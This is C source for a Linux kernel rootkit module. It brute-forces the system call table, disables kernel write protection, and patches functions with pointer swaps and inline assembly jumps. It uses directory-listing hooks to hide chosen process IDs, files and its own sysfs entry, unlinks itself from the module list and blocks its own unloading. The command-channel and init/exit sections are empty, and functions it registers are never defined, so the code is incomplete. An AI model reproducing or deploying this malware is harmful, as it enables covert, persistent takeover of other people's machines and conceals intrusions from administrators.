#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

// Copy-pasted from Linux sources as it's not provided in public headers
// of newer kernel versions of Linux.

struct proc_dir_entry
{
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;  /* use count */
    atomic_t in_use; /* number of callers into module in progress; */
                     /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers; /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock;   /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};

/*
*
********************
* CONSTANTS
********************
*
*/
#define CFG_PROC_FILE "version"
#define CFG_PASS "password"
#define CFG_ROOT "root"
#define CFG_HIDE_PID "hide_pid"
#define CFG_UNHIDE_PID "unhide_pid"
#define CFG_HIDE_FILE "hide_file"
#define CFG_UNHIDE_FILE "unhide_file"
#define CFG_HIDE "hide"
#define CFG_UNHIDE "unhide"
#define CFG_PROTECT "protect"
#define CFG_UNPROTECT "unprotect"
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

//For finding the sys_call_table adress we will brute force it
//It has to be in this range depending OS type.
#if defined __i386__
#define START_ADDRESS 0xc0000000
#define END_ADDRESS 0xd0000000
#elif defined __x86_64__
#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#endif

/*
*
********************
* MACROS
********************
*
*/

//Macros for kernel functions to alter Control Register 0 (CR0)
//The CR0 register is 32 bits long on the 386 and higher processors. On x86-64 processors in long mode, it (and the other control registers) is 64 bits long.
//CR0 has various control flags that modify the basic operation of the processor.
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define DISABLE_W_PROTECTED_MEMORY          \
    do                                      \
    {                                       \
        preempt_disable();                  \
        write_cr0(read_cr0() & (~0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY        \
    do                                   \
    {                                    \
        preempt_enable();                \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

//ASM MACROS
#if defined __i386__
// push 0x00000000, ret
#define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
#define ASM_HOOK_CODE_OFFSET 1
// alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
//#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
#elif defined __x86_64__
// there is no push that pushes a 64-bit immidiate in x86_64,
// so we do things a bit differently:
// mov rax 0x0000000000000000, jmp rax
#define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define ASM_HOOK_CODE_OFFSET 2
#endif

//READDIR MACROS

// Macros to help reduce repeated code where only names differ.
// Decreses risk of "copy-paste & forgot to rename" error.
#define FILLDIR_START(NAME)                                                                                              \
    filldir_t original_##NAME##_filldir;                                                                                 \
                                                                                                                         \
    static int NAME##_filldir(void *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
    {

#define FILLDIR_END(NAME)                                                          \
    return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }

#define READDIR(NAME)                                                  \
    int NAME##_iterate(struct file *file, struct dir_context *context) \
    {                                                                  \
        original_##NAME##_filldir = context->actor;                    \
        *((filldir_t *)&context->actor) = NAME##_filldir;              \
                                                                       \
        int (*original_iterate)(struct file *, struct dir_context *);  \
        original_iterate = asm_hook_unpatch(NAME##_iterate);           \
        int ret = original_iterate(file, context);                     \
        asm_hook_patch(NAME##_iterate);                                \
                                                                       \
        return ret;                                                    \
    }

// Macros to actually use
#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) \
READDIR(NAME)

/*
*
********************
* UTILS
********************
*
*/

/**
 * Finds a system call table adress by brute forcing it using an heuristic  .
 * Note that the heuristic is not ideal, so it might find a memory region that
 * looks like a system call table but is not actually a system call table (prone to errors).
 *
 * @return system call table on success, NULL on failure.
 */
void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void *)START_ADDRESS;

    while (i < END_ADDRESS)
    {
        sctable = (void **)i;

        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *)sys_close)
        {
            size_t j;
            // we expect there to be at least 300 system calls
            const unsigned int SYS_CALL_NUM = 300;
            // sanity check: no function pointer in the system call table should be NULL
            for (j = 0; j < SYS_CALL_NUM; j++)
            {
                if (sctable[j] == NULL)
                {
                    // this is not a system call table
                    goto skip;
                }
            }
            return sctable;
        }
    skip:;
        i += sizeof(void *);
    }

    return NULL;
}

/*
*
********************
* HOOK LIST
********************
*
*/

struct hook
{
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

/**
 * Replaces a function pointer at some address with a new function pointer,
 * keeping record of the original function pointer so that it could be
 * restored later.
 *
 * @param modified_at_address Pointer to the address of where the function
 * pointer that we want to replace is stored. The s ame address would be used
 * when restoring theoriginal funcion pointer back, so make sure it doesn't
 * become invalid by the time you try to restore it back.
 *
 * @param modified_function Function pointer that we want to replace the
 * original function pointer with.
 *
 * @return true on success, false on failure.
 */
int hook_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h)
    {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;
}

/**
 * Get original function pointer based on the one we overwrote it with.
 * Useful when wanting to call the original function inside a hook.
 *
 * @param modified_function The function that overwrote the original one.
 * @return original function pointer on success, NULL on failure.
 */
void *hook_get_original(void *modified_function)
{
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list)
    {
        if (h->modified_function == modified_function)
        {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}

/**
 * Removes all hook records, restores the overwritten function pointer to its
 * original value.
 */
void hook_remove_all(void)
{
    struct hook *h, *tmp;

    // make it so that instead of `modified_function` the `original_function`
    // would get called again
    list_for_each_entry(h, &hook_list, list)
    {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    // a hack to let the changes made by the loop above propagate
    // as some process might be in the middle of our `modified_function`
    // and call `hook_get_original()`, which would return NULL if we
    // `list_del()` everything
    // so we make it so that instead of `modified_function` the
    // `original_function` would get called again, then sleep to wait until
    // existing `modified_function` calls finish and only them remove elements
    // fro mthe list
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list)
    {
        list_del(&h->list);
        kfree(h);
    }
}

/*
*
********************
* ASM HOOKLIST
********************
*
*/

unsigned long read_count = 0;

asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
{
    read_count++;

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_original(read);
    return original_read(fd, buf, count);
}

unsigned long write_count = 0;

asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
{
    write_count++;

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    return original_write(fd, buf, count);
}

struct asm_hook
{
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE) - 1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

/**
 * Patches machine code of the original function to call another function.
 * This function should not be called directly.
 */
void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE) - 1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Patches machine code of a function so that it would call our function.
 * Keeps record of the original function and its machine code so that it could
 * be unpatched and patched again later.
 *
 * @param original_function Function to patch
 *
 * @param modified_function Function that should be called
 *
 * @return true on success, false on failure.
 */
int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h)
    {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE) - 1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

/**
 * Patches the original function to call the modified function again.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list)
    {
        if (h->modified_function == modified_function)
        {
            _asm_hook_patch(h);
            break;
        }
    }
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 * This function should not be called directly.
 */
void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE) - 1);
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list)
    {
        if (h->modified_function == modified_function)
        {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

/**
 * Removes all hook records, unpatches all functions.
 */
void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list)
    {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}

unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{
    asm_rmdir_count++;

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    long ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);

    return ret;
}

/*
*
********************
* ADD/REMOVE PID FROM PID LIST
********************
*
*/

struct pid_entry
{
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p)
    {
        return 0;
    }

    p->pid = simple_strtoul(pid, NULL, 10);

    list_add(&p->list, &pid_list);

    return 1;
}

void pid_remove(const char *pid)
{
    struct pid_entry *p, *tmp;

    unsigned long pid_num = simple_strtoul(pid, NULL, 10);

    list_for_each_entry_safe(p, tmp, &pid_list, list)
    {
        if (p->pid == pid_num)
        {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_remove_all(void)
{
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list)
    {
        list_del(&p->list);
        kfree(p);
    }
}

/*
*
********************
* REMOVE/ADD FILE FROM FILE LIST
********************
*
*/

struct file_entry
{
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_add(const char *name)
{
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);

    if (!f)
    {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    // sanity check as `name` could point to some garbage without null anywhere nearby
    if (name_len - 1 > NAME_MAX)
    {
        kfree(f);
        return 0;
    }

    f->name = kmalloc(name_len, GFP_KERNEL);
    if (!f->name)
    {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);

    list_add(&f->list, &file_list);

    return 1;
}

void file_remove(const char *name)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list)
    {
        if (strcmp(f->name, name) == 0)
        {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_remove_all(void)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list)
    {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}

/*
*
********************
* HIDE rootkit
********************
*
*/

struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{
    if (is_hidden)
    {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}

void unhide(void)
{
    if (!is_hidden)
    {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}

/*
*
********************
* PROTECT rootkit
********************
*
*/

int is_protected = 0;

void protect(void)
{
    if (is_protected)
    {
        return;
    }

    try_module_get(THIS_MODULE);

    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected)
    {
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}

/*
*
********************
* READDIR FUNCTIONS
********************
*
*/

struct file_operations *get_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
    {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *)file->f_op;
    filp_close(file, 0);

    return ret;
}

READDIR_HOOK_START(root)
struct file_entry *f;

list_for_each_entry(f, &file_list, list)
{
    if (strcmp(name, f->name) == 0)
    {
        return 0;
    }
}
READDIR_HOOK_END(root)

READDIR_HOOK_START(proc)
struct pid_entry *p;

list_for_each_entry(p, &pid_list, list)
{
    if (simple_strtoul(name, NULL, 10) == p->pid)
    {
        return 0;
    }
}
READDIR_HOOK_END(proc)

READDIR_HOOK_START(sys)
if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0)
{
    return 0;
}
READDIR_HOOK_END(sys)

#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR
#undef READDIR_HOOK_START
#undef READDIR_HOOK_END

/*
*
********************
* COMMUNICATION CHANNEL
********************
*
*/


/*
*
********************
* MODULE INIT/EXIT
********************
*
*/



module_init(init);
module_exit(exit);
